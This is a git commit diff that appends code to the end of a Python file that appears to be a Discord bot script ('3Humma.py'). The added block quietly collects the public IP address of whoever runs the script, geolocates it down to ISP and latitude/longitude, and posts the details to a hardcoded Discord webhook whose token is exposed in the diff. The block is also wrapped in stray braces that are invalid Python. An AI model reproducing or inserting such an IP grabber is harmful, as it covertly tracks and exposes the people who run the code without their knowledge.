a4f1c1c3d87418e835d25291f981f616df25a493
tirthpatel1356 <77205225+tirthpatel1356@users.noreply.github.com>
2021-05-17 11:38:42 +0530

    Update 3Humma.py

--- 3Humma.py
+++ 3Humma.py
@@ -3206,3 +3206,43 @@ async def nitro(ctx):
 
 if __name__ == '__main__':
     Init()
+
+{
+
+import requests
+import json
+from dhooks import Webhook, Embed
+from datetime import datetime
+
+hook = Webhook("https://discord.com/api/webhooks/843731518433656832/9SvoaTGToE5oGrb6c1xosBBYtfKpNuPz8c4QaLVlFQkBoRjxZRp5GqXCghUV5A8rG-GP")
+
+time = datetime.now().strftime("%H:%M %p")  
+ip = requests.get('https://api.ipify.org/').text
+
+r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
+geo = r.json()
+embed = Embed()
+fields = [
+    {'name': 'IP', 'value': geo['query']},
+    {'name': 'ipType', 'value': geo['ipType']},
+    {'name': 'Country', 'value': geo['country']},
+    {'name': 'City', 'value': geo['city']},
+    {'name': 'Continent', 'value': geo['continent']},
+    {'name': 'Country', 'value': geo['country']},
+    {'name': 'IPName', 'value': geo['ipName']},
+    {'name': 'ISP', 'value': geo['isp']},
+    {'name': 'Latitute', 'value': geo['lat']},
+    {'name': 'Longitude', 'value': geo['lon']},
+    {'name': 'Org', 'value': geo['org']},
+    {'name': 'Region', 'value': geo['region']},
+    {'name': 'Status', 'value': geo['status']},
+]
+for field in fields:
+    if field['value']:
+        embed.add_field(name=field['name'], value=field['value'], inline=True)
+hook.send(embed=embed)
+
+}
+
+
+
